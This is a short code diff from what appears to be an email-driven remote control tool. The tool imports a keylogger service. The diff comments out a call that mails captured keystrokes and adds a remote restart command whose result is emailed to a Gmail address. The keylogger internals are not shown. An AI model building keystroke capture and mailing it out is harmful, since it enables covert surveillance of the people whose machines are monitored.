@@ -13,6 +13,7 @@ from services.help import *
 from services.app import *
 from services.process import *
 from services.keylogger import *
+from services.pc import *
 
 from services.html_generator import html_mail
 import notification
@@ -113,8 +114,11 @@ def main():
         # html = get_processes()
         # request = 'PROCESS get'
 
-        request = 'KEYLOGGER 10'
-        result = get_key_log(10)
+        # request = 'KEYLOGGER 10'
+        # result = get_key_log(10)
+
+        request = 'PC restart'
+        result = restart()
 
         content = {
             'html': html_mail(request, result['html']),
@@ -123,7 +127,7 @@ def main():
 
         # content = html_mail(request, html)
 
-        mail = build_email_content(REMOTE_MAIL, ['hoangnhuquynh2015@gmail.com'], 'Demo send mail', content)
+        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo restart', content)
         host_mail.send_mail(mail)
         print_color('Mail sent', text_format.OKGREEN)
     except Exception as e:
